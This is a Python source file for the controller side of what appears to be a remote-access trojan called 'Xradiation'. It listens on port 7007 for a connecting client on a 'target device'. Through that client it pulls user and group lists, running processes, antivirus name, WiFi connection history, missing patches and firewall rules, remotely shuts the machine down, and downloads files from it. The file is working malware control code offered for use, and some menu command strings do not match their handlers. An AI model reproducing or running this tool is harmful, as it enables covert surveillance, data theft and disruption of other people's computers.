import socket
import os
import colorama
from colorama import Back, Fore, Style
import pandas as pd
from rich.table import Table
from rich.console import Console


colorama.init()
print("")
print(Fore.GREEN + "===========================")
print(Fore.RED +    "cHƈǟʀʟɨ3.Ӽʀǟɖɨǟȶɨօռ-opǝdɹɐ+")
print(Fore.GREEN + "===========================")
print("")

table = Table()
table.add_column("ƈσɱɱαɳԃʂ", justify="left", style="bright_yellow", no_wrap=True)
table.add_column("ԃҽʂƈɾιρƚισɳ", style="bright_yellow")
#table.add_column("Most recent version", justify="right", style="red")
 
table.add_row("Current Working Directory", "To see present working directory at destination")
table.add_row("List All Directories", "To get all directories, [Example C://Folder//Sub Folder/")
table.add_row("Local Users", "To get details of users")
table.add_row("Local Groups", "To get details of groups")
table.add_row("Active Connections", "To get details of active connections")
table.add_row("Remote OS Version", "To get details of Operating System")
table.add_row("Display Remote Processes", "To get list of all running processes at destination")
table.add_row("Installed Applications List", "To get list of installed applications on destination")
table.add_row("Physical Memory", "To get details of Primary Memory")
table.add_row("Bios Info", "Get remote device Bios information")
table.add_row("CPU Details", "Get remote device CPU details")
table.add_row("Remote Antivirus", "Get name of installed Antivirus")
table.add_row("WiFi Details", "Get wifi details and connection history")
table.add_row("Display Remote Services", "Get details of running services")
table.add_row("Installed Updates", "Get list of all installed updated on Target device")
table.add_row("Startup Details", "Get list of all startup processes")
table.add_row("Hardisk and Filesystem", "Get list of harddisk partations, file system, Total space and available space")
table.add_row("System Accounts", "Get list of System Accounts")
table.add_row("Missing OS Patches", "Get details of missing OS Patches on remote device")
table.add_row("Firewall Status", "Get Windows Firewall status and details") 
table.add_row("Firewall Rules", "Get Windows Firewall Rules")
table.add_row("Shutdown", "To shutdown remote device")
table.add_row("Download File", "Download file form remote device, use file full name with extension, user (List all directories) command to lookup in directories" ) 
 
 
 
console = Console()
console.print(table)

#Disable

s=socket.socket()
host=socket.gethostname()
port=7007
s.bind((host, port))
print()
print("waiting for connection...")
s.listen(1)
conn, addr = s.accept()
print()
print(addr, "waiting for connection...")

while 1:
    print("")
    command = input(str(">>>"))
    if command == "Current Working Directory":
        conn.send(command.encode())
        #print()
        #print("Processig...")
        #conn.recv(1024)
        #print("Getting Data...")
        files = conn.recv(5000)
        files = files.decode()
        print(Fore.MAGENTA + files)
    
    elif command == "List all directories":
        conn.send(command.encode())
        user_input = input(str("Enter Directory, e.g. C://"))
        conn.send(user_input.encode())
        files = conn.recv(5000)
        files = files.decode()
        print(Fore.MAGENTA + files)
    
    
    elif command == "Local Users":
        conn.send(command.encode())
        files = conn.recv(5000)
        files = files.decode()
        print(Fore.MAGENTA + files)
        
    elif command == "Local Groups":
        conn.send(command.encode())
        files = conn.recv(5000)
        files = files.decode()
        print(Fore.MAGENTA + files)
        
    elif command == "System Accounts":
        conn.send(command.encode())
        files = conn.recv(5000)
        files = files.decode()
        print(Fore.MAGENTA + files)
    
    elif command == "Active connections":
        conn.send(command.encode())
        files = conn.recv(5000)
        files = files.decode()
        print(Fore.MAGENTA + files)
    
    elif command == "Remote OS Version":
        conn.send(command.encode())
        files = conn.recv(5000)
        files = files.decode()
        print(Fore.MAGENTA + files)
    
    elif command == "Display Remote Processes":
        conn.send(command.encode())
        files = conn.recv(10000)
        files = files.decode()
        print(Fore.MAGENTA + files)
    
    elif command == "loop":
        conn.send(command.encode())
        files = conn.recv(5000)
        files = files.decode()
        print(files)
        
    elif command == "Installed Aplications List":
        conn.send(command.encode())
        files = conn.recv(10000)
        files = files.decode()
        print(Fore.MAGENTA + files)
    
    elif command == "Physical Memory":
        conn.send(command.encode())
        files = conn.recv(5000)
        files = files.decode()
        print(Fore.MAGENTA + files)
    
    elif command == "Bios Info":
        conn.send(command.encode())
        files = conn.recv(5000)
        files = files.decode()
        print(Fore.MAGENTA + files)
        
    elif command == "CPU Details":
        conn.send(command.encode())
        files = conn.recv(5000)
        files = files.decode()
        print(Fore.MAGENTA + files)
        
    elif command == "Remote Antivirus":
        conn.send(command.encode())
        files = conn.recv(5000)
        files = files.decode()
        print(Fore.MAGENTA + files)
        
    elif command == "WiFi Details":
        conn.send(command.encode())
        files = conn.recv(10000)
        files = files.decode()
        print(Fore.MAGENTA + files)
        
    elif command == "Display Remote Services":
        conn.send(command.encode())
        files = conn.recv(90000)
        files = files.decode()
        print(Fore.MAGENTA + files) 

    elif command == "Installed Updated":
        conn.send(command.encode())
        files = conn.recv(5000)
        files = files.decode()
        print(Fore.MAGENTA + files)
        
    elif command == "Startup Details":
        conn.send(command.encode())
        files = conn.recv(10000)
        files = files.decode()
        print(Fore.MAGENTA + files)
        
    elif command == "Hardisk and Filesystem":
        conn.send(command.encode())
        files = conn.recv(5000)
        files = files.decode()
        print(Fore.MAGENTA + files)
        
    elif command == "Missing OS Patches":
        conn.send(command.encode())
        files = conn.recv(5000)
        files = files.decode()
        print(Fore.MAGENTA + files)
        
    elif command == "Firewall Status":
        conn.send(command.encode())
        files = conn.recv(5000)
        files = files.decode()
        print(Fore.MAGENTA + files)
        
    elif command == "Firewall Rules":
        conn.send(command.encode())
        files = conn.recv(100000)
        files = files.decode()
        print(Fore.MAGENTA + files)
        
    elif command == "Shutdown":
        conn.send(command.encode())
        #files = conn.recv(100000)
        #files = files.decode()
        #print(Fore.RED + files)
        
    elif command == "Download File":
        conn.send(command.encode())
        file_path = input (str("Enter file name with extention: "))
        conn.send(file_path.encode())
        file = conn.recv(10000)
        file_name = input (str("Enter downloading File name to save:    "))
        renamed_file = open(file_name, "wb")
        renamed_file.write(file)
        renamed_file.close()
        print("")
        print(Fore.MAGENTA + file_name, "File Download")
        print("")
        
    elif command == "exit":
        conn.send(command.encode())
        exit()
        #files = conn.recv(100000)
        #files = files.decode()
        #print(Fore.RED + files)
        
                
    else:
        print("Wrong Command")
        
     
